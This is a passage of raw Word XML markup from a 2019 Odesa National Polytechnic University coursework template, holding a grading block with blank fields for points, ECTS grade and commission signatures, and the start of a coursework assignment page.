          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DC7E52">
        <w:t xml:space="preserve">                                                             </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Кількість</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>балів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">          </w:t>
      </w:r>
      <w:r w:rsidR="00DC7E52"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00DC7E52"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__</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRPr="00853AAF" w:rsidRDefault="00DC7E52" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Оцінка</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>: ECTS ____</w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">_ </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRDefault="00DC7E52" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Члени </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>комісії</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CE73AC" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">     </w:t>
      </w:r>
      <w:r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00CE73AC" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC"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rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidR="00CE73AC"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rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRPr="00853AAF" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                         </w:t>
      </w:r>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>підпис</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">)   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>прізвище</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ініціали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRPr="00853AAF" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                           </w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                                       </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRPr="00853AAF" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>підпис</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">)   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>прізвище</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ініціали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CE73AC" w:rsidRPr="00853AAF" w:rsidRDefault="00CE73AC" w:rsidP="00CE73AC">
      <w:pPr>
        <w:jc w:val="right"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                           </w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                                       </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007D0939" w:rsidRPr="00853AAF" w:rsidRDefault="00CE73AC" w:rsidP="00853AAF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                                                                   </w:t>
      </w:r>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                             </w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>п</w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ідпис</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">)   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>прізвище</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ініціали</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00853AAF">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C95742" w:rsidRPr="00853AAF" w:rsidRDefault="00DC7E52" w:rsidP="007D0939">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>м.</w:t>
      </w:r>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Одеса</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 2019</w:t>
      </w:r>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007D0939" w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>рік</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="269" w:lineRule="auto"/>
        <w:ind w:left="2017" w:hanging="10"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Одеський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національний</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>політехнічний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університет</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="269" w:lineRule="auto"/>
        <w:ind w:left="3203" w:right="2241" w:firstLine="58"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Інститут</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комп'ютерних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> систем Кафедра </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>інформаційних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> систем </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="26"/>
        <w:ind w:right="76"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="26"/>
        <w:ind w:right="76"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="26"/>
        <w:ind w:right="76"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ЗАВДАННЯ </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="27"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ind w:left="10" w:right="82" w:hanging="10"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">НА КУРСОВУ РОБОТУ </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:right="5"/>
        <w:jc w:val="center"/>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Default="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>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r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>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p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>прізвище</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ім’я</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, по </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>батькові</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">)   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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група</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24" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00853AAF">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
